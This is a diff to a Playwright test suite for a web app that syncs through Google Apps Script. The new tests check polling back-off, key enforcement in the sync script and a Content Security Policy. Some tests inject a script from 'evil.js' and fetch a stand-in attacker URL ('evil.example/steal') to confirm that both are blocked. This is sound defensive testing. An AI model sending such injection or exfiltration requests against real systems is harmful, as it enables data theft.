@@ -9,7 +9,7 @@ let browser;
 function ok(cond, msg) { if (!cond) throw new Error(msg); }
 async function T(id, name, fn, opt) {
   if (FILTER && !(id + ' ' + name).toLowerCase().includes(FILTER.toLowerCase())) return;
-  const c = await browser.newContext(Object.assign({ viewport: { width: 1280, height: 860 }, acceptDownloads: true }, opt || {}));
+  const c = await browser.newContext(Object.assign({ viewport: { width: 1280, height: 860 }, acceptDownloads: true, bypassCSP: true }, opt || {})); /* stub hosts such as https://sync.test are outside the app's CSP; Q24 and Q35 run with it enforced */
   await c.route('http://127.0.0.1:8765/**', r => r.abort()); /* never reach a real grader on this Mac */
   const p = await c.newPage(); p.errs = [];
   p.on('pageerror', e => p.errs.push(e.message)); p.on('dialog', d => { p.errs.push('native dialog: ' + d.message()); d.dismiss(); });
@@ -231,7 +231,7 @@ const syncNow = async p => { await p.evaluate(() => { S.settings.syncUrl = 'http
     const r = await p.evaluate(async () => { const s = document.createElement('script'); s.textContent = 'window.__inl = 1'; document.head.appendChild(s); const x = document.createElement('script'); x.src = 'https://example.com/evil.js'; document.head.appendChild(x); await new Promise(r => setTimeout(r, 800)); return [!!document.querySelector('meta[http-equiv="Content-Security-Policy"]'), window.__inl || 0]; });
     p.errs = p.errs.filter(e => !/Content Security Policy|Refused/.test(e));
     ok(r[0] && !r[1], 'no policy, or an injected inline script ran: ' + r);
-  });
+  }, { bypassCSP: false });
 
   await T('Q25', 'the public repository holds no keys, sync URLs or personal data (tools/secret_scan.py --all)', async () => {
     const r = require('child_process').spawnSync('python3', ['tools/secret_scan.py', '--all'], { encoding: 'utf8' });
@@ -300,6 +300,50 @@ const syncNow = async p => { await p.evaluate(() => { S.settings.syncUrl = 'http
     const other = ctx.login_(''), mine = ctx.login_('da-abc');
     ok(!other.ok && /another app/.test(other.error) && mine.ok && mine.session, 'other: ' + JSON.stringify(other) + ' mine: ' + JSON.stringify(mine));
   });
+
+  await T('Q33', 'grading through the sync script backs off (at most 8 checks per answer) and pauses while the tab is hidden', async (p, c) => {
+    const log = { results: 0, asks: 0 };
+    await c.route('https://sync.test/**', r => { const q = r.request(); if (q.method() === 'POST') { log.asks++; return r.fulfill({ contentType: 'application/json', body: '{"ok":true}' }); } if (/action=results/.test(q.url())) log.results++; return r.fulfill({ contentType: 'application/json', body: '{"ok":true,"results":{}}' }); });
+    await p.clock.install(); await boot(p);
+    const adv = async ms => { for (let s = 0; s < ms; s += 5000) { await p.clock.runFor(Math.min(5000, ms - s)); await p.waitForTimeout(25); } }; /* fake time, with real time for the network between steps */
+    await p.evaluate(() => { S.settings.syncUrl = 'https://sync.test/exec?k=test'; S.settings.ai = true; window.__h = false; Object.defineProperty(document, 'hidden', { configurable: true, get: () => window.__h }); gradeNow('qa:g1', 'answer', { question: 'q', answer: 'a' }, 'a', 'q'); });
+    await p.waitForTimeout(800); ok(log.asks === 1, 'job not sent');
+    await adv(30000); const early = log.results; /* back-off: about 2 checks in 30 s (the old 4-second loop made 7) */
+    ok(early >= 2 && early <= 3, 'expected 2 or 3 checks in the first 30 s, got ' + early);
+    await p.evaluate(() => { window.__h = true; document.dispatchEvent(new Event('visibilitychange')); });
+    await adv(30 * 60000); const hidden = log.results - early;
+    ok(hidden <= 1, 'kept checking while hidden: ' + hidden);
+    await p.evaluate(() => { window.__h = false; document.dispatchEvent(new Event('visibilitychange')); });
+    await adv(60 * 60000);
+    ok(log.results <= 8 && log.results >= 6, 'checks per answer: ' + log.results + ' (want at most 8)');
+  });
+
+  await T('Q34', 'the sync script refuses everything when no KEY is set, unless a valid sign-in session comes with the request', async () => {
+    const vm = require('vm'), fs = require('fs'), src = fs.readFileSync('sync/Code.gs', 'utf8');
+    const run = (key, sessions) => { const props = { sessions: JSON.stringify(sessions || {}) }, out = []; const ctx = { JSON, Date, Object, String,
+      ContentService: { createTextOutput: s => ({ setMimeType: () => (out.push(JSON.parse(s)), JSON.parse(s)) }), MimeType: { JSON: 'json' } },
+      PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k], setProperty: (k, v) => { props[k] = v; } }) },
+      DriveApp: { getFilesByName: () => ({ hasNext: () => true, next: () => ({ getBlob: () => ({ getDataAsString: () => '{"done":{"x":1}}' }), setContent: () => { } }) }) },
+      LockService: { getScriptLock: () => ({ waitLock: () => { }, releaseLock: () => { } }) }, UrlFetchApp: {}, Utilities: { getUuid: () => 'u' } };
+      vm.createContext(ctx); vm.runInContext(src.replace("const KEY = '';", 'const KEY = ' + JSON.stringify(key) + ';'), ctx); return ctx; };
+    const open = run(''); const g = open.doGet({ parameter: {} }), pl = open.doPost({ parameter: {}, postData: { contents: '{"action":"load"}' } });
+    ok(g.ok === false && /no KEY set/.test(g.error) && pl.ok === false && !pl.data, 'empty KEY still serves data: ' + JSON.stringify([g, pl]).slice(0, 160));
+    const sess = run('', { s1: Date.now() + 36e5 }).doPost({ parameter: {}, postData: { contents: '{"action":"load","session":"s1"}' } });
+    ok(sess.ok === true && sess.data, 'a valid session was refused');
+    const keyed = run('k123'); ok(keyed.doGet({ parameter: { k: 'k123' } }).ok === true && keyed.doGet({ parameter: { k: 'nope' } }).ok === false, 'KEY check broken');
+    ok(typeof open.authorize === 'function', 'authorize() helper missing');
+  });
+
+  await T('Q35', 'the page may only call the hosts it needs (CSP connect-src), and Settings refuses a sync URL outside Google Apps Script', async p => {
+    await boot(p);
+    const r = await p.evaluate(async () => { let blocked = false; document.addEventListener('securitypolicyviolation', e => { if (/evil/.test(e.blockedURI)) blocked = true; }); try { await fetch('https://evil.example/steal?d=1'); } catch (e) { } await new Promise(r => setTimeout(r, 300)); return [blocked, document.querySelector('meta[http-equiv="Content-Security-Policy"]').content]; });
+    ok(r[0] && !/connect-src[^;]*https:(\s|;)/.test(r[1]), 'a request to an unknown host was not blocked: ' + r[1].match(/connect-src[^;]*/)[0]);
+    await p.evaluate(() => { location.hash = '#/profile'; }); await p.waitForTimeout(500);
+    await p.fill('#st_sync', 'https://evil.example/exec?k=abc'); await p.dispatchEvent('#st_sync', 'change'); await p.waitForTimeout(400);
+    ok(await p.evaluate(() => !S.settings.syncUrl) && /not a Google Apps Script web app/.test(await toasts(p)), 'a foreign sync URL was saved');
+    await p.fill('#st_sync', 'https://script.google.com/macros/s/AKfycbTEST123/exec?k=abc'); await p.dispatchEvent('#st_sync', 'change'); await p.waitForTimeout(400);
+    ok(await p.evaluate(() => /script\.google\.com/.test(S.settings.syncUrl || '')), 'a real Apps Script URL was refused');
+  }, { bypassCSP: false });
 
   await browser.close();
   for (const r of results) console.log(r[0].padEnd(5), r[1], r[2], r[3] ? '\n      ' + r[3] : '');
